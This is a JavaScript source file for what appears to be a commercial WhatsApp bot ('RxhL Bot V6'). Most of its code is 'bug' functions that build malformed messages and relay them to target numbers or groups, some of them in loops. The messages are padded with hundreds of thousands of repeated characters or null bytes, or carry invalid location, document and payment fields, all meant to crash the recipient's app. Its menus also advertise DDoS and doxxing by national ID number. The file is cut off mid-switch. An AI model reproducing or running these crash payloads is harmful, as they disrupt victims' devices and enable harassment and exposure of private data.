require('./settings')
require('./lib/language')
require('./lib/virtex/virus')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = global.baileys1
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./lib/storage')
const { JSDOM } = require('jsdom')
module.exports = rxhl = async (rxhl, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation: (m.mtype == 'imageMessage') ? m.message.imageMessage.caption: (m.mtype == 'videoMessage') ? m.message.videoMessage.caption: (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text: (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId: (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId: (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId: (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text): ''
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./lib/owner.json'))
const murbug = JSON.parse(fs.readFileSync('./lib/murbug.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botNumber = await rxhl.decodeJid(rxhl.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isMurbug = [botNumber, ...murbug].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const qtext = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await rxhl.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const rxhlimage = fs.readFileSync('./lib/image/rxhl.jpg')
const mime = (quoted.msg || quoted).mimetype || ''
const { uptotelegra } = require('./lib/upload')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const virgam = fs.readFileSync('./lib/virtex/virgam.jpeg')
const slayer07 = fs.readFileSync('./lib/image/slayer07.jpg')
const ytdl = require("ytdl-core")
const bugthumb = fs.readFileSync ('./lib/image/mamak.jpg')
const { startbot, stopjadibot } = require('./lib/start')
const responbug = 'wait for the process to complete'


// Hahahaha
if (!rxhl.public) {
if (!isCreator) return
}

if (command) {
console.log("");
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 WhatsApp messages! 🚀`)));
console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${time}
💬 MESSAGE: ${command}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`)));
}

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
rxhl.sendPresenceUpdate(jd, from)
}

async function loading () {
var rxhlloading = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"Loading Selesai..."
]
let { key } = await rxhl.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
for (let i = 0; i < rxhlloading.length; i++) {
await rxhl.sendMessage(from, {text: rxhlloading[i], edit: key });
}
}

// Function Penting

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

rxhl.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await rxhl.sendPresenceUpdate('composing', jid)
      return rxhl.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
   

// batas

// Function Bug

const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": rxhlimage
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"RxhlOfficial ✅",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const bugquoteddvc = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `RxhlOfc`
}
}
}

async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `RXHL BUG WHATSAPP ✅`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await rxhl.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendViewOnceMessages(jid) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    rxhl.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
}

async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "RxhlCrash",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b9e707fbbbea9277c9a0e.jpg" } }, { upload: rxhl.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #RxhlOfficial"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await rxhl.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `RXHL DOCUMENT ✅`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await rxhl.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await rxhl.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "RXHL MODS WHATSAPP" + "\0".repeat(920000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await rxhl.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½'+"ꦾ".repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await rxhl.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "RXHL MODS WHATSAPP"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'RXHL MODS WHATSAPP', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await rxhl.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  rxhl.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    await sleep(1500)
    sendLiveLocationMessage(jid);
    await sleep(2000)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    await sleep(1500)
    sendSystemCrashMessage(jid);
    await sleep(2000)
    sendSystemCrashMessage(jid);
    await sleep(500);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: `RxhlOfficial`
}
}
}

async function iponcrash(target) {
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await rxhl.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}

async function bughomebutton(jid) {
var etc = generateWAMessageFromContent(jid, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "IYA IN"
    },
    "footer": {
      "text": "›RxhlOfficial"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'RxhlBugWhatsApp', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: jid, quoted: m })
await rxhl.relayMessage(jid, etc.message, { messageId: etc.key.id })
}

async function sendBugIos(jid) {
iponcrash(jid)
sleep(500)
sendExtendedTextMessage(jid)
}

// Batas 


const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const replyy = (teks) => {
return rxhl.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `RXHL DEVELOPER 🌛`,"body": `Hai ${pushname}`, "previewType": "PHOTO","thumbnail": rxhlimage,"sourceUrl": `https://youtube.com/@rxhlofc`}}}, { quoted:m})} 

const replyz = (teks) => { 
rxhl.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "VIP-RxhL-V6 ✅", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": rxhlimage, 
"mediaUrl": "https://telegra.ph/file/36376f0b21362491e91d8.jpg", 
"sourceUrl": "https://whatsapp.com/channel/0029Vaji4vy2phHVjC6xOJ1H" }}}, { quoted: m }) }

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
ytdl(Link, { filter: 'audioonly' }).pipe(fs.createWriteStream(mp3File)).on('finish', async () => {
await rxhl.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(`./${mp3File}`)
})
} catch (err) {
replyz(`${err}`)
}
}

const rxhlbugnew = { 
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `Rxhl Official 💸`
}
}
}

// Komen
switch(command) {
// MENU
case 'menu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
┃⭔ Creator : Rxhl Official
┃⭔ Partner : -
┃⭔ Type : Case
┃⭔ Status : Online
┃⭔ Mode : ${rxhl.public ? 'Public' : 'Self'}
┃⭔ Prefix : Multi 
┗❐
 
┏❐   \`Bot Fitur\` 
┃
┃⭔ ${prefix}self 
┃⭔ ${prefix}public 
┃⭔ ${prefix}setppbot
┃⭔ ${prefix}setppbot /full
┃
┗❐

┏❐   \`List Menu\` 
┃
┃⭔ ${prefix}bugmenu 
┃⭔ ${prefix}bugmenuv2
┃⭔ ${prefix}bugmenuvip
┃⭔ ${prefix}specialmenuvip
┃⭔ ${prefix}aksesmenu
┃⭔ ${prefix}soundmenu
┃⭔ ${prefix}groupmenu
┃⭔ ${prefix}stickermenu
┃⭔ ${prefix}downloadmenu
┃⭔ ${prefix}toolsmenu
┃⭔ ${prefix}asupanmenu
┃⭔ ${prefix}rxhlmenu
┃⭔ ${prefix}txtmenu
┃⭔ ${prefix}infobot
┃
┗❐`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `RxhlOfficial`
})
break
case 'specialmenuvip':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
┃⭔ Creator : Rxhl Official
┃⭔ Partner : -
┃⭔ Type : Case
┃⭔ Status : Online
┃⭔ Mode : ${rxhl.public ? 'Public' : 'Self'}
┃⭔ Prefix : Multi 
┗❐
 
┏❐   \`Bot Fitur\` 
┃
┃⭔ ${prefix}self 
┃⭔ ${prefix}public 
┃⭔ ${prefix}setppbot
┃⭔ ${prefix}setppbot /full
┃
┗❐

┏❐   \`VIP Menu\` 
┃
┃⭔ ${prefix}ddos *website duration*
┃⭔ ${prefix}dox *nik*
┃⭔ ${prefix}getnik 
┃
┗❐`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `RxhlOfficial`
})
break
// BUG MENU
case 'bugmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
┃⭔ Creator : Rxhl Official
┃⭔ Partner : -
┃⭔ Type : Case
┃⭔ Status : Online
┃⭔ Mode : ${rxhl.public ? 'Public' : 'Self'}
┃⭔ Prefix : Multi 
┗❐
 
┏❐   \`Bot Fitur\` 
┃
┃⭔ ${prefix}self 
┃⭔ ${prefix}public 
┃⭔ ${prefix}setppbot
┃⭔ ${prefix}setppbot /full
┃
┗❐

┏❐   \`Bug Crash Chat\`
┃
┃⭔ ${prefix}bugcrash *+628xxx*
┃⭔ ${prefix}bugsystem *+628xxx*
┃⭔ ${prefix}crash1jam *+628xxx*
┃⭔ ${prefix}crash1hari *+628xxx*
┃⭔ ${prefix}xreactpc *+628xxx*
┃⭔ ${prefix}bugiospc *+628xxx|Amount*
┃⭔ ${prefix}bugaudiopc *+628xxx|Amount*
┃⭔ ${prefix}buglocpc *+628xxx|Amount*
┃⭔ ${prefix}bugparamspc *+628xxx|Amount*
┃⭔ ${prefix}bughomepc *+628xxx|Amount*
┃⭔ ${prefix}bannedno *+628xxx*
┃⭔ ${prefix}bugvid1
┃⭔ ${prefix}bugvid2
┃
┗❐

┏❐   \`Bug Crash Grup\`
┃
┃⭔ ${prefix}bugcrashv2 *Id Grup*
┃⭔ ${prefix}bugsystemv2  *Id Grup*
┃⭔ ${prefix}xreactgc  *Id Grup*
┃⭔ ${prefix}bugiosgc *Id Grup|Amount*
┃⭔ ${prefix}bugaudiogc *Id Grup|Amount*
┃⭔ ${prefix}buglocgc *Id Grup|Amount*
┃⭔ ${prefix}bugparamsgc *Id Grup|Amount*
┃⭔ ${prefix}bughomegc *Id Grup|Amount*
┃⭔ ${prefix}getidgrup *Link Gc*
┃
┗❐

┏❐   \`Bug Crash In Place\`
┃
┃⭔ ${prefix}bugcrashv3
┃⭔ ${prefix}bugsystemv3  
┃⭔ ${prefix}bugparamsin 
┃
┗❐

┏❐   \`Bug Crash Emote\`
┃
┃⭔ ${prefix}🔥  *+628xxx|Amount*
┃⭔ ${prefix}♥️  *+628xxx|Amount*
┃⭔ ${prefix}🥰  *+628xxx|Amount*
┃⭔ ${prefix}🤤  *+628xxx|Amount*
┃⭔ ${prefix}😱  *+628xxx|Amount*
┃⭔ ${prefix}💝  *+628xxx|Amount*
┃⭔ ${prefix}😭  *+628xxx|Amount*
┃⭔ ${prefix}😁  *+628xxx|Amount*
┃⭔ ${prefix}🔥  *+628xxx|Amount*
┃⭔ ${prefix}😡  *+628xxx|Amount*
┃⭔ ${prefix}😒  *+628xxx|Amount*
┃
┗❐

┏❐   \`Special Bug\`
┃
┃⭔ ${prefix}rxhlbug *628xxx|Amount*
┃⭔ ${prefix}rxhlkeren *628xxx|Amount*
┃⭔ ${prefix}rxhlganteng *628xxx|Amount*
┃⭔ ${prefix}rxhlios *628xxx|Amount*
┃⭔ ${prefix}rxhlandro *628xxx|Amount*
┃
┗❐

┏❐   \`Other Menu \`
┃⭔ ${prefix}bannedno *628xxxx*
┃⭔ ${prefix}tempban  *62|8xxx*
┃⭔ ${prefix}ddos  *<website> <duration>*
┗❐

┏❐   \`⚠️WARNING!!\`
┃
┃> _ [🇮🇩] Pada menu bug crash1jam dan crash1hari diharapkan untuk tidak terlalu sering menggunakan menu tersebut. karena menu tersebut akan mengirimkan bug yang sangat banyak dan menyebabkan rawan terkena banned._
┃> _ [🇬🇧] In the crash1jam and crash1hari bug menus, please don't use the menu too often. because this menu will send a lot of bugs and make you prone to getting banned
┃
┗❐`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `RxhlOfficial`
})
break
case 'bugmenuv2':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
┃⭔ Creator : Rxhl Official
┃⭔ Partner : -
┃⭔ Type : Case
┃⭔ Status : Online
┃⭔ Mode : ${rxhl.public ? 'Public' : 'Self'}
┃⭔ Prefix : Multi 
┗❐
 
┏❐   \`Bot Fitur\` 
┃
┃⭔ ${prefix}self 
┃⭔ ${prefix}public 
┃⭔ ${prefix}setppbot
┃⭔ ${prefix}setppbot /full
┃
┗❐

┏❐   \`Bug Crash Chat V2\`
┃
┃⭔ ${prefix}iosfull *+628xxx|Amount*
┃⭔ ${prefix}iosfullv2 *+628xxx|Amount*
┃⭔ ${prefix}samsungcrash *+628xxx|Amount*
┃⭔ ${prefix}samsungfull *+628xxx|Amount*
┃⭔ ${prefix}samsung-brutal *+628xxx|Amount*
┃⭔ ${prefix}slayer07 *+628xxx|Amount*
┃⭔ ${prefix}darkness *+628xxx|Amount*
┃⭔ ${prefix}virkon *+628xxx|Amount*
┃⭔ ${prefix}virgam *+628xxx|Amount*
┃⭔ ${prefix}fatal-ui *+628xxx|Amount*
┃⭔ ${prefix}fatal-notif *+628xxx|Amount*
┃⭔ ${prefix}bug-brutal *+628xxx|Amount*
┃⭔ ${prefix}crash-all-dvc *+628xxx|Amount*
┃
┗❐ 

┏❐   \`Special Menu V2\`
┃
┃⭔ ${prefix}getnik
┃⭔ ${prefix}dox <nik>
┃
┗❐`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `RxhlOfficial`
})
break
case 'bugmenuvip':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'RXHL OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY RXHL OFC','description':'Telegram: @rxhlvro','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `┏❐  ⌜ RxhL - Bot - V6 ⌟  ❐
┃⭔ Creator : Rxhl Official
┃⭔ Partner : -
┃⭔ Type : Case
┃⭔ Status : Online
┃⭔ Mode : ${rxhl.public ? 'Public' : 'Self'}
┃⭔ Prefix : Multi 
┗❐
 
┏❐   \`Bot Fitur\` 
┃
┃⭔ ${prefix}self 
┃⭔ ${prefix}public 
┃⭔ ${prefix}setppbot
┃⭔ ${prefix}setppbot /full
┃
┗❐

┏❐   \`Bug Crash Chat VIP\`
┃
┃⭔ ${prefix}all-dvc2 *+628xxx*
┃⭔ ${prefix}killwhatsapp *+628xxx*
┃⭔ ${prefix}auto-crash *+628xxx*
┃⭔ ${prefix}new-bunga *+628xxx*
┃⭔ ${prefix}kill-ripper *+628xxx*
┃⭔ ${prefix}external-crash1 *+628xxx*
┃⭔ ${prefix}external-crash2 *+628xxx*
┃⭔ ${prefix}external-crash3 *+628xxx*
┃⭔ ${prefix}internal-crash1 *+628xxx*
┃⭔ ${prefix}internal-crash2 *+628xxx*
┃⭔ ${prefix}onlyios-crash *+628xxx*
┃⭔ ${prefix}onlysamsung-crash *+628xxx*
┃
┗❐

┏❐   \`Bug Crash Grup VIP\`
┃
┃⭔ ${prefix}crashgc-v1 *ID GRUP*
┃⭔ ${prefix}crashgc-v2 *ID GRUP*
┃
┗❐ `
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `RxhlOfficial`
})
break
// TXT MENU
case 'txtmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
